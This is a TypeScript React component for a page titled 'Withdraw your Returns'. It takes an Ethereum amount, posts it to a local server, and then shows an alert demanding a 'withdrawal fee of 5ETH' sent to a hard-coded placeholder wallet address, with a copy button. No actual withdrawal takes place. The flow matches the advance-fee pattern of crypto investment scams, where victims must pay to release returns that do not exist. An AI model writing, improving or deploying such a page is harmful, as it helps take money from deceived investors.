import React, { useState } from "react";
import { Form, Button, Modal, Alert } from "react-bootstrap";

const cryptocurrencies = ["Ethereum"];

const WithdrawalForm: React.FC = () => {
  const [selectedCrypto, setSelectedCrypto] = useState<string>("");
  const [amount, setAmount] = useState<number|string>('');
  const [showModal, setShowModal] = useState<boolean>(false);
  const [showAlert, setShowAlert] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);

  const walletAddress = "0x1234567890abcdef";

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setShowModal(true);
    setError(null);

    try {
   
      const response = await fetch("http://localhost:5000/update-withdrawal", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          newWithdrawalAmount: amount,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to update withdrawal details");
      }

      const data = await response.json();
      console.log("Withdrawal details updated:", data);

      setShowModal(false);
      setShowAlert(true);
    } catch (err: any) {
      console.error("Error updating withdrawal details:", err);
      setError(err.message);
      setShowModal(false);
    }
  };

  const handleCopy = () => {
    navigator.clipboard
      .writeText(walletAddress)
      .then(() => {
        alert("Wallet address copied to clipboard!");
      })
      .catch((err) => {
        alert("Failed to copy wallet address: " + err);
      });
  };

  return (
    <div className="container mt-5">
      <h2 className="mb-4">Withdraw your Returns</h2>
      <Form onSubmit={handleSubmit}>
        <Form.Group className="mb-3">
          <Form.Label>Select Cryptocurrency</Form.Label>
          <Form.Select
            value={selectedCrypto}
            onChange={(e) => setSelectedCrypto(e.target.value)}
            required
          >
            <option value="">Choose...</option>
            {cryptocurrencies.map((crypto) => (
              <option key={crypto} value={crypto}>
                {crypto}
              </option>
            ))}
          </Form.Select>
        </Form.Group>

        <Form.Group className="mb-3">
          <Form.Label>Amount</Form.Label>
          <Form.Control
            type="text"
            value={amount}
            onChange={(e) => setAmount(Number(e.target.value))}
            placeholder="Enter amount"
            required
          />
        </Form.Group>

        <Button variant="primary" type="submit">
          Withdraw
        </Button>
      </Form>

      {/* Loading Modal */}
      <Modal show={showModal} centered backdrop="static" keyboard={false}>
        <Modal.Body>
          <div className="text-center">
            <div className="spinner-border text-primary" role="status">
              <span className="visually-hidden">Loading...</span>
            </div>
            <p className="mt-2">Fetching withdrawal details...</p>
          </div>
        </Modal.Body>
      </Modal>

      {/* Success Alert */}
      <Alert
        show={showAlert}
        variant="danger"
        onClose={() => setShowAlert(false)}
        className="mt-3 text-center"
      >
        Please pay withdrawal fee of 5ETH to complete your transaction.
        <div>Wallet Address</div>
        <div>{walletAddress}</div>
        <Button onClick={handleCopy}>Copy Wallet Address</Button>
      </Alert>

      {/* Error Alert */}
      {error && (
        <Alert
          variant="danger"
          onClose={() => setError(null)}
          dismissible
          className="mt-3"
        >
          {error}
        </Alert>
      )}
    </div>
  );
};

export default WithdrawalForm;